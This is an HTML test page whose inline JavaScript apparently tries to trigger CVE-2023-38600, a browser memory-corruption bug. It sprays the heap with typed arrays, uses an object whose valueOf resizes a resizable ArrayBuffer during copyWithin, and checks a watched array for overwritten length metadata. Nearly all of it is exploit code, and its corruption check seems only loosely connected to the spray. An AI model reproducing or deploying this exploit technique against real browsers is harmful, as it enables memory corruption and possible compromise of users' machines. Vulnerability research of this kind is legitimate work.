<!DOCTYPE html>
<html>
<head>
    <title>CVE-2023-38600 - Enhanced Detection</title>
    <script>
        function log(msg) {
            document.body.innerHTML += msg + "<br>";
        }

        window.onload = () => {
            log("Starting enhanced CVE-2023-38600 test...");

            // Spray Float64Arrays to fill heap
            const sprayCount = 1000;
            let spray = [];
            for (let i = 0; i < sprayCount; i++) {
                spray.push(new Float64Array(4)); // Small but aligned size
            }

            // Create a "watched" array whose length we will check
            let watched = new Uint32Array(4);
            watched[0] = 0x11223344;
            log("Initial watched.length = " + watched.length);

            // Evil object to resize mid-copyWithin
            const evil = {
                valueOf: () => {
                    buffer.resize(8); // Resize during copyWithin
                    return 0;
                }
            };

            // Resizable ArrayBuffer
            const buffer = new ArrayBuffer(16, { maxByteLength: 0x10000 });
            const view = new Uint8Array(buffer);

            // Try multiple times to trigger bug
            for (let i = 0; i < 10; i++) {
                try {
                    view.copyWithin(0, evil, 16);
                    log(`Exploit run ${i+1} finished.`);
                } catch (e) {
                    log(`Exception at run ${i+1}: ${e.message}`);
                    break;
                }
            }

            // Check if watched array was corrupted
            if (watched.length !== 4) {
                log("ðŸ’¥ Length was overwritten!");
                log("New watched.length = " + watched.length);
            } else {
                log("No metadata corruption detected.");
            }

            // Optional: Dump first few values of watched buffer
            log("watched[0] = " + watched[0].toString(16));
        };
    </script>
</head>
<body>
    <h2>CVE-2023-38600 Enhanced Test</h2>
    <p>Testing memory corruption using heap spraying and metadata checks.</p>
</body>
</html>
